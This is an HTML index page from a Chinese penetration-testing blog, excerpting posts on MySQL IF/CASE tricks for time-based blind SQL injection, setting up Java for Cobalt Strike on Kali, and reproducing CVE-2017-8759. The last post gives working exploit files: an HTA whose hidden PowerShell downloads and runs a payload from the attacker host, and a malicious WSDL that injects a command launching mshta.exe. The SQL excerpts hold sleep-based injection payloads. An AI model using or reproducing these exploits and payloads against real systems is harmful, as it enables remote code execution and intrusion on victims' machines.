@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"m0nst3r.me","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+<meta property="og:type" content="website">
+<meta property="og:title" content="m0nst3r&#39;s blog">
+<meta property="og:url" content="https://m0nst3r.me/page/7/index.html">
+<meta property="og:site_name" content="m0nst3r&#39;s blog">
+<meta property="og:description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="m0nst3r">
+<meta property="article:tag" content="Web安全,渗透测试,网络安全,代码审计,逆向,编程">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://m0nst3r.me/page/7/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/7/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>m0nst3r's blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">m0nst3r's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hello, Bugs</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">m0nst3r</p>
+  <div class="site-description" itemprop="description">Web安全、渗透测试、网络安全、代码审计、逆向、编程</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/sqli/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84IF%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/sqli/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84IF%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" class="post-title-link" itemprop="url">MySql中的IF表达式</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-10-17 11:12:00" itemprop="dateCreated datePublished" datetime="2017-10-17T11:12:00+08:00">2017-10-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/sqli/" itemprop="url" rel="index"><span itemprop="name">sqli</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]</p>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><ol>
+<li>一般为SQL盲注或时间注入在时候。</li>
+<li>逗号<code>,</code>没有被过滤的情况下。<blockquote>
+<p>如果注入点过滤了逗号<code>,</code>，可用CASE表达式绕过，参考<a href="http://m0nst3r.me/sqli/95.html" title="SQL注入中的CASE表达式">SQL注入中的CASE表达式</a></p>
+</blockquote>
+</li>
+</ol>
+<h2 id="MySql中的IF表达式"><a href="#MySql中的IF表达式" class="headerlink" title="MySql中的IF表达式"></a>MySql中的IF表达式</h2><h3 id="定义参考"><a href="#定义参考" class="headerlink" title="定义参考"></a>定义参考</h3><ol>
+<li><p>官方参考：<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/control-flow-functions.html#function_if" title="MYSQL IF表达式参考">MYSQL IF表达式参考</a></p>
+</li>
+<li><p>语法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关于返回值<br>  3.1 如果<code>expr1</code>不等于<code>0</code>，且<code>expr1</code>不等于<code>NULL</code>，则整个表达式的结果为<code>expr2</code>，否则为<code>expr3</code>。<br>  3.2 如果<code>expr1</code>，<code>expr2</code>中只有一个为<code>NULL</code>,则整个<code>IF()</code>表达式的返回值类型为那个<code>非NULL</code>表达式的类型。<br>  3.3 默认的返回值遵守以下规则：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果`expr2`或者`expr3`会产生一个`string`，则返回值为`string`;</span><br><span class="line">如果`expr2`和`expr3`都是`string`，且任何其中一个是大小写敏感的，则返回值也是大小写敏感的；</span><br><span class="line">如果`expr3`或者`expr3`产生一个浮点类型的值，则结果为一个浮点类型的值；</span><br><span class="line">如果`expr2`或者`expr3`会产生一个整数，则结果为一个整数。</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>##举例</p>
+<pre>
+mysql> select if(1<0,sleep(5),sleep(2)); 0 1 +---------------------------+ | if(1<0,sleep(5),sleep(2)) row in set (2.00 sec) < pre><!--0,sleep(5),sleep(2));--></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/sqli/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84IF%E8%A1%A8%E8%BE%BE%E5%BC%8F.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/sqli/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84CASE%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/sqli/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84CASE%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" class="post-title-link" itemprop="url">MySql中的CASE表达式</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-10-17 11:12:00" itemprop="dateCreated datePublished" datetime="2017-10-17T11:12:00+08:00">2017-10-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/sqli/" itemprop="url" rel="index"><span itemprop="name">sqli</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在做CTF的时候，发现一个时间盲注，一时间忘记怎么手工，不能忍，果断搜索了一波。</p>
+<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol>
+<li>盲注</li>
+<li>绕过过滤逗号<code>,</code>的注入点</li>
+</ol>
+<h2 id="MySql中的CASE表达式"><a href="#MySql中的CASE表达式" class="headerlink" title="MySql中的CASE表达式"></a>MySql中的CASE表达式</h2><h3 id="定义参考"><a href="#定义参考" class="headerlink" title="定义参考"></a>定义参考</h3><ol>
+<li><p>先附上官方参考：<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/control-flow-functions.html" title="MySQL CASE 表达式参考">MySQL CASE 表达式参考</a></p>
+</li>
+<li><p>CASE表达式的两种写法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CASE</span> <span class="keyword">value</span> <span class="keyword">WHEN</span> [compare_value] <span class="keyword">THEN</span> <span class="keyword">result</span> [<span class="keyword">WHEN</span> [compare_value] <span class="keyword">THEN</span> <span class="keyword">result</span> ...] [<span class="keyword">ELSE</span> <span class="keyword">result</span>] <span class="keyword">END</span></span><br><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> [<span class="keyword">condition</span>] <span class="keyword">THEN</span> <span class="keyword">result</span> [<span class="keyword">WHEN</span> [<span class="keyword">condition</span>] <span class="keyword">THEN</span> <span class="keyword">result</span> ...] [<span class="keyword">ELSE</span> <span class="keyword">result</span>] <span class="keyword">END</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><ol>
+<li>第一种语法<pre>
+ mysql> select case 1 when 1 then 'one' end;
+ +------------------------------+
+ | case 1 when 1 then 'one' end |
+ +------------------------------+
+ | one                          |
+ +------------------------------+
+ 1 row in set (0.04 sec)
+
+ mysql> select case 1 when 1=1 then sleep(5) end;
+ +-----------------------------------+
+ | case 1 when 1=1 then sleep(5) end |
+ +-----------------------------------+
+ |                                 0 |
+ +-----------------------------------+
+ 1 row in set (5.00 sec)
+ 
+ mysql> select case 1 when 1=2 then sleep(5) when 1=1 then sleep(2) end;
+ +----------------------------------------------------------+
+ | case 1 when 1=2 then sleep(5) when 1=1 then sleep(2) end |
+ +----------------------------------------------------------+
+ |                                                        0 |
+ +----------------------------------------------------------+
+ 1 row in set (2.00 sec)</pre></li>
+</ol>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/sqli/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84CASE%E8%A1%A8%E8%BE%BE%E5%BC%8F.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html" class="post-title-link" itemprop="url">Kali 配置Java 1.7</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-10-14 11:12:00" itemprop="dateCreated datePublished" datetime="2017-10-14T11:12:00+08:00">2017-10-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/blaa/" itemprop="url" rel="index"><span itemprop="name">blaa</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]<br>##需求<br>Cobalt strike 用openjdk的话，不稳定，而且运行时候提示openjdk不推荐。</p>
+<p>##更新步骤</p>
+<ol>
+<li><p>下载JDK1.7,这个版本是比较稳定的，对于cobalt strike来说。下载地址我找到过一次，后来在也找不到了，不知道为啥。JDK1.7百度网盘地址下载在后面。</p>
+</li>
+<li><p>将下载的jdk1.7解压缩。</p>
+</li>
+<li><p>在<code>/usr/lib/jvm</code>下新建<code>jdk17</code>，将解压出来的目录移动到该目录下。</p>
+</li>
+<li><p>运行以下三条命令，安装JDK1.7：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk17/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk17/bin/javac 1</span><br><span class="line">update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk17/bin/jar 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配置JDK1.7为默认java：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives --config java</span><br><span class="line">There are 2 choices for the alternative java (providing /usr/bin/java).</span><br><span class="line"></span><br><span class="line">  Selection    Path                                            Priority   Status</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">* 0            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      auto mode</span><br><span class="line">  1            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      manual mode</span><br><span class="line">  2            /usr/lib/jvm/jdk17/bin/java                      1         manual mode</span><br></pre></td></tr></table></figure>
+<p> 选择<code>2</code>。完成。</p>
+</li>
+</ol>
+<p>##截图<br><img src="/images/96e085a2caa5e97c26663bb0e40147d948d162ee.png" alt="jdk2.png"></p>
+<p><img src="/images/6dd796eb36b2da20640f15e5a365aee4b36a26d3.png" alt="jdk.png"></p>
+<p>##JDK1.7下载<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1jHHOxtO" title="JDK7">JDK7 百度网盘</a></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/blaa/Kali%20%E9%85%8D%E7%BD%AEJava%201.7.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/pentest/CVE-2017-8759%20+%20Cobalt%20Strike%20%E5%AE%8C%E7%BE%8E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0.html" class="post-title-link" itemprop="url">CVE-2017-8759 + Cobalt Strike 完美复现过程笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2017-09-27 11:12:00" itemprop="dateCreated datePublished" datetime="2017-09-27T11:12:00+08:00">2017-09-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[TOC]</p>
+<blockquote>
+<p>主要参考文章是来自<code>Lz1y</code> 大神的文章：<a target="_blank" rel="noopener" href="http://www.lz1y.cn/wordpress/?p=799">http://www.lz1y.cn/wordpress/?p=799</a></p>
+</blockquote>
+<p>更新记录：</p>
+<blockquote>
+<p>最新修改与：2017年9月28日</p>
+</blockquote>
+<p>##工具</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/Lz1y/CVE-2017-8759.git">https://github.com/Lz1y/CVE-2017-8759.git</a></li>
+<li>Cobalt Strike（请自行下载）</li>
+</ol>
+<p>##步骤</p>
+<ol>
+<li>在kali上面，执行命令<br>  <code>git clone https://github.com/Lz1y/CVE-2017-8759.git</code></li>
+<li>进入cobalt strike目录，执行:<br>  <code>./teamserver 192.168.1.9 123456</code></li>
+<li>在cobalt strike目录，执行<code>./cobaltstrike</code>运行cobalt strike客户端。</li>
+<li>在cobalt strike中新建<code>Listener</code>，类型用<code>http</code>的，端口输入<code>80</code>。</li>
+<li>进入该目录，依次修改以下文档：<br>  5.1 <code>gedit cmd.jpg</code> (先<code>cp cmd.hta cmd.jpg</code>)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">    window.resizeTo 0,0</span><br><span class="line">    window.MoveTo -100,-100</span><br><span class="line">	const impersonation = 3</span><br><span class="line">	Const HIDDEN_WINDOW = 12</span><br><span class="line">	Set Locator = CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">    Locator.Run&quot;powershell.exe -nop -w hidden -c &quot;&quot;IEX (new-object net.webclient).downloadstring(&#x27;http://192.168.1.9:80/a&#x27;)&quot;&quot;&quot;,0,FALSE</span><br><span class="line">    window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Sub window_onload</span><br><span class="line">	const impersonation = 3</span><br><span class="line">	Const HIDDEN_WINDOW = 12</span><br><span class="line">	Set Locator = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)</span><br><span class="line">	Set Service = Locator.ConnectServer()</span><br><span class="line">	Service.Security_.ImpersonationLevel=impersonation</span><br><span class="line">	Set objStartup = Service.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">	Set objConfig = objStartup.SpawnInstance_</span><br><span class="line">	Set Process = Service.Get(&quot;Win32_Process&quot;)</span><br><span class="line">	Error = Process.Create(&quot;powershell.exe -nop -w hidden calc.exe&quot;, null, objConfig, intProcessID)</span><br><span class="line">	window.close()</span><br><span class="line">end sub</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<img src="/images/6159be0672af87636a5ba845eb097b115a8a5f54.png" alt="微信截图_20170927155342.png"><br>5.2 <code>gedit exploit.txt</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">﻿&lt;definitions</span><br><span class="line">    xmlns=&quot;http://schemas.xmlsoap.org/wsdl/&quot;</span><br><span class="line">    xmlns:soap=&quot;http://schemas.xmlsoap.org/wsdl/soap/&quot;</span><br><span class="line">    xmlns:suds=&quot;http://www.w3.org/2000/wsdl/suds&quot;</span><br><span class="line">    xmlns:tns=&quot;http://schemas.microsoft.com/clr/ns/System&quot;</span><br><span class="line">    xmlns:ns0=&quot;http://schemas.microsoft.com/clr/nsassem/Logo/Logo&quot;&gt;</span><br><span class="line">    &lt;portType name=&quot;PortType&quot;/&gt;</span><br><span class="line">    &lt;binding name=&quot;Binding&quot; type=&quot;tns:PortType&quot;&gt;</span><br><span class="line">        &lt;soap:binding style=&quot;rpc&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;</span><br><span class="line">        &lt;suds:class type=&quot;ns0:Image&quot; rootType=&quot;MarshalByRefObject&quot;&gt;&lt;/suds:class&gt;</span><br><span class="line">    &lt;/binding&gt;</span><br><span class="line">    &lt;service name=&quot;Service&quot;&gt;</span><br><span class="line">        &lt;port name=&quot;Port&quot; binding=&quot;tns:Binding&quot;&gt;</span><br><span class="line">            &lt;soap:address location=&quot;http://192.168.1.9?C:\Windows\System32\mshta.exe?http://192.168.1.9/cmd.jpg&quot;/&gt;</span><br><span class="line">                        &lt;soap:address location=&quot;;</span><br><span class="line">                        if (System.AppDomain.CurrentDomain.GetData(_url.Split(&#x27;?&#x27;)[0]) == null) &#123;</span><br><span class="line">                                System.Diagnostics.Process.Start(_url.Split(&#x27;?&#x27;)[1], _url.Split(&#x27;?&#x27;)[2]);</span><br><span class="line">                                System.AppDomain.CurrentDomain.SetData(_url.Split(&#x27;?&#x27;)[0], true);</span><br><span class="line">                        &#125; //&quot;/&gt;</span><br><span class="line">        &lt;/port&gt;</span><br><span class="line">    &lt;/service&gt;</span><br><span class="line">&lt;/definitions&gt; </span><br></pre></td></tr></table></figure>
